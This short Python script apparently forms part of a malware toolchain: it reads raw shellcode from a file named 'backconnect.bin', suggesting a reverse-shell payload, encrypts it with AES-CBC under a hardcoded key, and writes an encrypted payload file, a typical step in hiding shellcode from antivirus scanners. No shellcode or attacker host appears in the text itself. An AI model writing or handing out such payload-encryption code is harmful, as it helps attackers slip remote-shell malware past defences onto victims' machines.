from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os

key = b'ThisIsA16ByteKey'  # 16 bytes key
iv = os.urandom(16)         # Random IV

with open("backconnect.bin", "rb") as f:
    shellcode = f.read()

cipher = AES.new(key, AES.MODE_CBC, iv)
enc_shellcode = cipher.encrypt(pad(shellcode, 16))

with open("encrypted_payload.bin", "wb") as f:
    f.write(iv + enc_shellcode)  # prepend IV for use in decryption
                                                                     
